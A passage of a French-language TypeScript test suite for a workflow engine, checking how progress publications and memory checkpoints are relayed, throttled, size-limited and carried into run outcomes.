        { t: "fin", donnees: [] },
      ]),
    });
    essai(e);
    const r4 = await executerWorkflow(e.ctx, e.infra);
    expect(r4.execution.blocs.map((x) => x.statut)).toEqual(["reussi", "reussi", "pas-lance", "pas-lance"]);
  });

  it("publication relayée seulement pendant la chaîne et à 5 s d'écart ; ignorée avant la chaîne, pour un essai, sans auFilDeLEau, au-delà de 2 Mo", async () => {
    const gros = "x".repeat(2 * 1024 * 1024);
    const pas = (avancer: (ms: number) => () => void) => [
      debutBloc("liste"), finBloc("liste"),
      pub("avant la chaîne", 0, 3),
      debutBloc("fiche"),
      pub("entre deux debut", 0, 3),
      debutBloc("avis"),
      pub("A", 1, 3),
      avancer(3000), pub("trop tôt", 2, 3),
      avancer(1500), pub("C", 2, 3),
      avancer(5000), pub("faits > total", 4, 3),
      avancer(5000), pub(gros, 3, 3),
      avancer(5000), pub("D", 3, 3),
      finBloc("fiche"),
      avancer(5000), pub("après une fin", 3, 3),
      finBloc("avis"),
      avancer(5000), pub("après la chaîne", 3, 3),
      debutBloc("sortie"), finBloc("sortie"),
      { t: "fin", donnees: "finale" },
    ];
    const lancerAvec = async (workflow: unknown, regler: (b: Banc) => void = () => {}) => {
      const b = await banc(workflow);
      const avancer = horlogeFactice(b);
      b.infra.lancer = lanceurPas(pas(avancer));
      regler(b);
      const relayees: unknown[] = [];
      b.infra.surPublication = async (p) => {
        relayees.push(p);
      };
      const r = await executerWorkflow(b.ctx, b.infra);
      expect(r.issue).toMatchObject({ t: "fin", sortie: { valeur: "finale" } });
      return relayees;
    };

    expect(await lancerAvec(veille({ auFilDeLEau: true }))).toEqual([
      { donnees: "A", faits: 1, total: 3 },
      { donnees: "C", faits: 2, total: 3 },
      { donnees: "D", faits: 3, total: 3 },
    ]);
    expect(await lancerAvec(veille({ auFilDeLEau: true }), essai)).toEqual([]);
    expect(await lancerAvec(veille(), (b) => void (b.ctx.dureeMaxMinutes = 30))).toEqual([]);
  });

  it("une surPublication lente est finie avant que executerWorkflow rende", async () => {
    const b = await banc(veille({ auFilDeLEau: true }));
    const avancer = horlogeFactice(b);
    b.infra.lancer = lanceurPas([
      debutBloc("liste"), finBloc("liste"), debutBloc("fiche"), debutBloc("avis"),
      pub("A", 1, 2), avancer(5000), pub("B", 2, 2),
      finBloc("fiche"), finBloc("avis"), debutBloc("sortie"), finBloc("sortie"),
      { t: "fin", donnees: "finale" },
    ]);
    const finies: unknown[] = [];
    let enCours = 0;
    let auPlus = 0;
    b.infra.surPublication = async (p) => {
      enCours++;
      auPlus = Math.max(auPlus, enCours);
      await new Promise((ok) => setTimeout(ok, 80));
      finies.push(p.donnees);
      enCours--;
    };
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(finies).toEqual(["A", "B"]);
    expect(auPlus).toBe(1);
    expect(r.issue).toMatchObject({ t: "fin", sortie: { valeur: "finale" } });
  });

  it("progressif : surMemoire au plus toutes les 30 s ; un echec porte la dernière mémoire reçue ; non progressif : ni surMemoire ni memoire dans l'issue", async () => {
    // L'empreinte des paramètres validés (défauts compris) du bloc liste.
    const empreinte = empreinteParametres(valide(veille()).workflow.blocs.find((x) => x.id === "liste")!.parametres);
    const m = (n: number) => ({ t: "memoire", memoire: { liste: { type: "code", valeur: n }, inconnu: { type: "code", valeur: n } } });
    const marquee = (n: number) => ({ liste: { type: "code", valeur: n, empreinte } });
    const lancerAvec = async (d: number | undefined, fin: unknown = { t: "echec", erreur: "cassé" }) => {
      const b = await banc(veille());
      if (d !== undefined) b.ctx.dureeMaxMinutes = d;
      const avancer = horlogeFactice(b);
      b.infra.lancer = lanceurPas([m(1), avancer(10_000), m(2), avancer(25_000), m(3), m(4), fin]);
      const relayees: unknown[] = [];
      b.infra.surMemoire = async (x) => {
        relayees.push(x);
      };
      const r = await executerWorkflow(b.ctx, b.infra);
      return { r, relayees };
    };

    const prog = await lancerAvec(30);
    expect(prog.relayees).toEqual([marquee(1), marquee(3)]);
    expect(prog.r.issue).toEqual({ t: "echec", erreur: "cassé", erreurDuCode: true, memoire: marquee(4) });

    const sans = await lancerAvec(undefined);
    expect(sans.relayees).toEqual([]);
    expect(sans.r.issue).toEqual({ t: "echec", erreur: "cassé", erreurDuCode: true });

    // Une fin garde la mémoire comme aujourd'hui.
    const fin = await lancerAvec(30, { t: "fin", donnees: null });
    expect(fin.r.issue).toMatchObject({ t: "fin", memoire: marquee(4) });
  });

  it("progressif : un arrêt (délai) porte la dernière mémoire reçue ; une mémoire encore tenue (rien reçu après) ne compte pas ; non progressif : aucune", async () => {
    // L'empreinte des paramètres validés (défauts compris) du bloc liste.
    const empreinte = empreinteParametres(valide(veille()).workflow.blocs.find((x) => x.id === "liste")!.parametres);
    const lancerAvec = async (d: number | undefined) => {
      const b = await banc(veille(), {}, { delaiMs: 300 });
      if (d !== undefined) b.ctx.dureeMaxMinutes = d;
      b.infra.lancer = lanceurPas(
        [
          { t: "memoire", memoire: { liste: { type: "code", valeur: 7 } } },
          { t: "journal", bloc: "liste", texte: "suite" },
          // Tenue jusqu'à la ligne suivante, qui n'arrive jamais : elle pourrait précéder une publication jamais lue.
          { t: "memoire", memoire: { liste: { type: "code", valeur: 8 } } },
        ],
        { bloque: true },
      );
      return (await executerWorkflow(b.ctx, b.infra)).issue;
    };
    expect(await lancerAvec(30)).toEqual({ t: "arret", statut: "erreur", erreur: "Délai dépassé", memoire: { liste: { type: "code", valeur: 7, empreinte } } });
    expect(await lancerAvec(undefined)).toEqual({ t: "arret", statut: "erreur", erreur: "Délai dépassé" });
  });

  describe("la mémoire qui précède une publication suit son sort (R34)", () => {
    const empreinte = () => empreinteParametres(valide(veille()).workflow.blocs.find((x) => x.id === "liste")!.parametres);
    const mem = (n: number) => ({ t: "memoire", memoire: { liste: { type: "code", valeur: n } } });
    const marquee = (n: number) => ({ liste: { type: "code", valeur: n, empreinte: empreinte() } });
    const ouvrirChaine = [debutBloc("liste"), finBloc("liste"), debutBloc("fiche"), debutBloc("avis")];
    const lancerAvec = async (pas: (avancer: (ms: number) => () => void) => unknown[]) => {
      const b = await banc(veille({ auFilDeLEau: true }));
      const avancer = horlogeFactice(b);
      b.infra.lancer = lanceurPas(pas(avancer));
      const publiees: unknown[] = [];
      const memoires: unknown[] = [];
      b.infra.surPublication = async (p) => void publiees.push(p.donnees);
      b.infra.surMemoire = async (m) => void memoires.push(m);
      const r = await executerWorkflow(b.ctx, b.infra);
      return { issue: r.issue, publiees, memoires };
    };

    it("une publication de plus de 2 Mo suivie d'un echec : l'issue porte la mémoire d'avant, même après d'autres mémoires", async () => {
      const r = await lancerAvec((avancer) => [
        ...ouvrirChaine,
        mem(1), pub("A", 1, 3),
        avancer(5000), mem(2), pub("x".repeat(2 * 1024 * 1024 + 10), 2, 3),
        // Envoyée ensuite par le conteneur (verifierMemoire, avant echec) : elle retient encore les clés de la publication rejetée.
        avancer(40_000), mem(3),
        { t: "echec", erreur: "cassé" },
      ]);
      expect(r.publiees).toEqual(["A"]);
      expect(r.memoires).toEqual([marquee(1)]);
      expect(r.issue).toEqual({ t: "echec", erreur: "cassé", erreurDuCode: true, memoire: marquee(1) });
    });

    it("une publication acceptée après une rejetée remet la mémoire en route", async () => {
      const r = await lancerAvec((avancer) => [
        ...ouvrirChaine,
        mem(1), pub("A", 1, 3),
        avancer(5000), mem(2), pub("faits > total", 4, 3),
        avancer(1000), mem(3), pub("B", 2, 3),
        mem(4),
        { t: "echec", erreur: "cassé" },
      ]);
      expect(r.publiees).toEqual(["A", "B"]);
      expect(r.issue).toEqual({ t: "echec", erreur: "cassé", erreurDuCode: true, memoire: marquee(4) });
    });

    it("deux publications dans le même morceau de stdout : la seconde est rejetée et sa mémoire écartée", async () => {
      const ligne = (x: unknown) => JSON.stringify(x) + "\n";
      const r = await lancerAvec(() => [
        ...ouvrirChaine,
        ligne(mem(1)) + ligne(pub("A", 1, 3)) + ligne(mem(2)) + ligne(pub("B", 2, 3)) + ligne({ t: "echec", erreur: "cassé" }),
      ]);
      expect(r.publiees).toEqual(["A"]);
      expect(r.issue).toEqual({ t: "echec", erreur: "cassé", erreurDuCode: true, memoire: marquee(1) });
    });

    it("une fin garde la dernière mémoire reçue, comme avant (la sortie montre tout)", async () => {
      const r = await lancerAvec((avancer) => [
        ...ouvrirChaine,
        mem(1), pub("A", 1, 3),
        avancer(1000), mem(2), pub("trop tôt", 2, 3),
        finBloc("fiche"), finBloc("avis"), debutBloc("sortie"), finBloc("sortie"),
        mem(3),
        { t: "fin", donnees: "finale" },
      ]);
      expect(r.issue).toMatchObject({ t: "fin", memoire: marquee(3) });
    });

    it("F1 : les données d'une publication sont écrites avant la mémoire qu'elle rend sûre", async () => {
      const b = await banc(veille({ auFilDeLEau: true }));
      b.infra.lancer = lanceurPas([...ouvrirChaine, mem(1), pub("A", 1, 3), { t: "echec", erreur: "cassé" }]);
      const ecrits: string[] = [];
      b.infra.surPublication = async (p) => {
        await new Promise((ok) => setTimeout(ok, 20));
        ecrits.push(`donnees ${p.donnees}`);
      };
      b.infra.surMemoire = async (m) => void ecrits.push(`memoire ${m.liste?.valeur}`);
      const r = await executerWorkflow(b.ctx, b.infra);
      expect(ecrits).toEqual(["donnees A", "memoire 1"]);
      expect(r.issue).toMatchObject({ memoire: marquee(1) });
    });

    it("F1 : une écriture de données refusée laisse la mémoire douteuse jusqu'à la prochaine publication écrite", async () => {
      const lancer = async (pas: unknown[]) => {
        const b = await banc(veille({ auFilDeLEau: true }));
        const avancer = horlogeFactice(b);
        b.infra.lancer = lanceurPas(pas.map((p) => (p === "avancer" ? avancer(5000) : p)));
        const memoires: unknown[] = [];
        b.infra.surPublication = async (p) => {
          if (p.donnees === "refusee") throw new Error("disque plein");
        };
        b.infra.surMemoire = async (m) => void memoires.push(m);
        const r = await executerWorkflow(b.ctx, b.infra);
        return { issue: r.issue, memoires };
      };
      const refusee = await lancer([...ouvrirChaine, mem(1), pub("refusee", 1, 3), mem(2), { t: "journal", bloc: "fiche", texte: "x" }, { t: "echec", erreur: "cassé" }]);
      expect(refusee.memoires).toEqual([]);
      expect(refusee.issue).toEqual({ t: "echec", erreur: "cassé", erreurDuCode: true, memoire: null });
      const reprise = await lancer([...ouvrirChaine, mem(1), pub("refusee", 1, 3), "avancer", mem(2), pub("B", 2, 3), mem(3), { t: "echec", erreur: "cassé" }]);
      expect(reprise.memoires).toEqual([marquee(2)]);
      expect(reprise.issue).toEqual({ t: "echec", erreur: "cassé", erreurDuCode: true, memoire: marquee(3) });
    });

    it("une mémoire après la fin du bloc de sortie, puis fin : ni relayée ni sûre, elle ne sert qu'à l'issue fin", async () => {
      const r = await lancerAvec((avancer) => [
        ...ouvrirChaine,
        mem(1), pub("A", 1, 3),
        avancer(40_000),
        finBloc("fiche"), finBloc("avis"), debutBloc("sortie"), finBloc("sortie"),
        mem(2),
        { t: "fin", donnees: "finale" },
      ]);
      expect(r.memoires).toEqual([marquee(1)]);
      expect(r.issue).toMatchObject({ t: "fin", memoire: marquee(2) });
    });

    it("une mémoire suivie de fin n'est pas relayée, même sans trace de fin de sortie", async () => {
      const r = await lancerAvec((avancer) => [
        ...ouvrirChaine,
        mem(1), pub("A", 1, 3),
        avancer(40_000), mem(2),
        { t: "fin", donnees: "finale" },
      ]);
      expect(r.memoires).toEqual([marquee(1)]);
      expect(r.issue).toMatchObject({ t: "fin", memoire: marquee(2) });
    });

    it("une mémoire après la fin du bloc de sortie, puis echec : l'issue garde la mémoire sûre d'avant", async () => {
      const r = await lancerAvec((avancer) => [
        ...ouvrirChaine,
        mem(1), pub("A", 1, 3),
        avancer(40_000),
        finBloc("fiche"), finBloc("avis"), debutBloc("sortie"), finBloc("sortie"),
        mem(2), { t: "journal", bloc: "sortie", texte: "après" },
        { t: "echec", erreur: "cassé" },
      ]);
      expect(r.memoires).toEqual([marquee(1)]);
      expect(r.issue).toEqual({ t: "echec", erreur: "cassé", erreurDuCode: true, memoire: marquee(1) });
    });
  });

  it("TAILLE_MAX_DONNEES d'interpreteur.mjs égale celle du noyau, réexportée par accueil", async () => {
    const interpreteur = await import(pathToFileURL(join(MOTEUR, "interpreteur.mjs")).href);
    expect(interpreteur.TAILLE_MAX_DONNEES).toBe(TAILLE_MAX_DONNEES);
    expect(TAILLE_MAX_DONNEES_ACCUEIL).toBe(TAILLE_MAX_DONNEES);
    expect(TAILLE_MAX_DONNEES).toBe(2 * 1024 * 1024);
  });

  it("ECART_PUBLICATIONS_MS et ECART_MEMOIRE_MS d'executer.ts égalent ceux d'interpreteur.mjs", async () => {
    const interpreteur = await import(pathToFileURL(join(MOTEUR, "interpreteur.mjs")).href);
    expect(ECART_PUBLICATIONS_MS).toBe(5000);
    expect(ECART_MEMOIRE_MS).toBe(30_000);
    expect(interpreteur.ECART_PUBLICATIONS_MS).toBe(ECART_PUBLICATIONS_MS);
    expect(interpreteur.ECART_MEMOIRE_MS).toBe(ECART_MEMOIRE_MS);
  });
});
